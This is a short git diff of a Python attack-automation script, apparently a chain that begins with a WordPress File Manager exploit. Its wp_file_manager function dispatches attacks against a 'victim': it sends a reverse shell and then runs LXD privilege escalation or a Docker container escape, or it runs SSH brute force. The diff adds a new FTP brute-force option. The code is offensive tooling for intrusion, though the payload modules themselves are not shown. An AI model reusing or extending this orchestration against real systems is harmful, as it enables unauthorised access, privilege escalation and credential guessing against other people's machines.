@@ -6,6 +6,7 @@ from Privilege_Escalation_LXD import LXD_exploit
 from DockerEscape import escape_docker
 from configparser import ConfigParser 	
 from SSH import ssh_bruteforce
+from FTP import ftp_bruteforce
 import create_conf
 
 def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
@@ -25,21 +26,28 @@ def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
 			victim_info = config_object["VICTIMINFO"]
 			general_info = config_object["GENERALINFO"]
 			
-		print('[*] (On Repeat, Attack {i} from {k}) <'.format(i=i+1, k=k), end="")
+			print('[*] (On Repeat, Attack {i} of {k}) <'.format(i=i+1, k=k), end="")
 		match int(exp):
 			case 1:
-				print("LXD>")
+				if arguments.repeat != None:
+					print("LXD>")
 				send_rev(attacker_info, victim_info)
 				LXD_exploit.run(victim_info, attacker_info, general_info, arguments)
 			case 2:
 				pass
 			case 3:
-				print("Docker>")
+				if arguments.repeat != None:
+					print("Docker>")
 				send_rev(attacker_info, victim_info)
 				escape_docker.run(victim_info, attacker_info, general_info, arguments)
 			case 4:
-				print("SSH>")
+				if arguments.repeat != None:
+					print("SSH>")
 				ssh_bruteforce.run(victim_info, attacker_info, general_info, arguments)
+			case 5:
+				if arguments.repeat != None:
+					print("FTP>")
+				ftp_bruteforce.run(victim_info, attacker_info, general_info, arguments)
 			case default:
 				sys.exit("Something went wrong, invalid exploit")
 		
